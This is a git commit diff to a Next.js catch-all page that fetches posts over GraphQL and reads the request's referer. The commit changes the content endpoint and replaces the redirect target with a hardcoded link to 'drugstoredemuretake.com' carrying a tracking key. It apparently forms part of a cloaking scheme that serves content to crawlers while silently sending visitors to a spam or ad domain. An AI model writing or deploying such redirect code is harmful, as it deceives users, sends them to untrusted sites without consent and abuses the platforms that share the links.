e39b2b7d5b389cc847cc04663d567c9d6928ad2b
Sanzu0 <131111841+Sanzu0@users.noreply.github.com>
2024-05-19 10:13:31 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://photo-hunter.free.nf/graphql"
+	const endpoint = "https://dev-knowledge-news.pantheonsite.io/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://photo-hunter.free.nf/` + encodeURI(path as string)
+					`https://drugstoredemuretake.com/aqk6qtqp6m?key=bd68087c90734851688a6b2e9705502c/`
 				}`,
 			},
 		};
